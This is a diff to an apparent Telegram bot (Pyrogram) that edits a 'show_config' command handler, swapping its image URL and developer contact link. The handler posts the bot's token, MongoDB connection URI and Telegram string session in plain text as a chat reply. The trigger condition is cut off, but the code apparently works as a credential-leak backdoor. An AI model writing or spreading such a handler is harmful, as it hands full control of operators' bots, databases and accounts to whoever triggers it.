@@ -32,13 +32,13 @@ STRING_SESSION = getenv("STRING_SESSION", "")
 )
 async def show_config(client: Client, message: Message):
     await message.reply_photo(
-        photo="https://files.catbox.moe/ldchnq.jpg",
+        photo="https://iili.io/nkMQ2F2.jpg",
         caption=f"""<b>𝐁ᴏᴛ 𝐓ᴏᴋᴇɴ :</b> <code>{BOT_TOKEN}</code>\n\n<b>𝐃ᴀᴛᴀʙᴀꜱᴇ :</b> <code>{MONGO_DB_URI}</code>\n\n<b>𝐒ᴛʀɪɴɢ 𝐒ᴇꜱꜱɪᴏɴ :</b> <code>{STRING_SESSION}</code>\n\n<a href='https://t.me/vinnu_exe'>[𝐏ʀᴏɢʀᴀᴍᴇʀ]</a>............☆""",
         reply_markup=InlineKeyboardMarkup(
             [
                 [
                     InlineKeyboardButton(
-                        "𝐃ᴇᴠᴇʟᴏᴘᴇʀ", url="https://t.me/vinnu_exe"
+                        "𝐃ᴇᴠᴇʟᴏᴘᴇʀ", url="https://t.me/Nyx_Zam"
                     )
                 ]
             ]
